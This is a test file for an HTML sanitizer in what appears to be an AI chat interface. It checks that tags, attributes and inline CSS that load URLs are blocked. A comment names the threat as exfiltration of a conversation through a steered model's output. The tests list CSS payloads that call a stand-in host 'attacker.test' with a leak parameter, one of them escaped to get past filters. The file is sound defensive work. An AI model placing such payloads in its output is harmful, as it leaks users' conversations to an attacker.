import { FORBIDDEN_ATTRIBUTES, FORBIDDEN_TAGS, isSafeInlineStyle, UNTRUSTED_HTML_CONFIG } from '@/shared/lib/sanitizeHtml';
import { describe, expect, it } from 'vitest';

// Untrusted HTML (assistant answers, tool results) must never make the
// browser load a URL on its own: that would send the conversation to whoever
// steered the model.
describe('sanitizeHtml', () => {
    it('forbids every tag that loads media, embeds a document or takes input', () => {
        expect(FORBIDDEN_TAGS).toEqual(
            expect.arrayContaining([
                'video',
                'audio',
                'source',
                'picture',
                'track',
                'iframe',
                'object',
                'embed',
                'form',
                'input',
                'button',
                'style',
                'image',
                'feimage',
            ]),
        );
        expect(UNTRUSTED_HTML_CONFIG.FORBID_TAGS).toEqual(FORBIDDEN_TAGS);
    });

    it('forbids every attribute that loads a URL without a click', () => {
        expect(FORBIDDEN_ATTRIBUTES).toEqual(expect.arrayContaining(['poster', 'background', 'srcset', 'formaction']));
        expect(UNTRUSTED_HTML_CONFIG.FORBID_ATTR).toEqual(FORBIDDEN_ATTRIBUTES);
    });

    it('keeps inline styles that only lay out text', () => {
        expect(isSafeInlineStyle('height:0.6944em;')).toBe(true);
        expect(isSafeInlineStyle('top:-3.063em; margin-right: 0.05em; color: #cc0000')).toBe(true);
    });

    it('drops inline styles that could load a resource', () => {
        for (const style of [
            'background:url(https://attacker.test/?leak=1)',
            'background: URL ( "//attacker.test/x" )',
            'background-image:image-set("https://attacker.test/a.png" 1x)',
            'background:\\75 rl(https://attacker.test/)',
            '@import "https://attacker.test/a.css"',
            'list-style: image("https://attacker.test/a.png")',
        ]) {
            expect(isSafeInlineStyle(style)).toBe(false);
        }
    });
});
